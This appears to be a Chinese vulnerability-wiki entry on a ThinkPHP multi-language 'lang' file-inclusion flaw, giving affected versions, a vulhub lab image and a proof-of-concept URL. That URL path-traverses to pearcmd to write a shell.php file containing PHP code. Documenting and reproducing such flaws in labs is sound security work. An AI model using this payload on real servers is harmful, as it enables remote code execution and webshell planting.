# ThinkPHP LoadLangPack lang 任意文件包含漏洞

## 漏洞描述

当Thinkphp 程序开启了多语言功能时，可以通过 get、header、cookie 等位置传入参数，使用 pearcmd 文件包含达到命令执行，获取服务器权限

## 漏洞影响

<a-checkbox checked>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</a-checkbox></br>

## 环境搭建

<a-checkbox checked>docker pull vulhub/thinkphp:6.0.12</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1671154096412-bb0dedfd-eb08-4b0c-af16-60a54db8a17d.png)

验证POC

```php
/public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php
```

![img](../../../.vuepress/public/img/1671154607827-3548f528-c745-4ed1-994a-8aee9850ddee.png)![img](../../../.vuepress/public/img/1671154706972-596ab1d0-26ce-428b-a54b-b94ddaf4e8ef.png)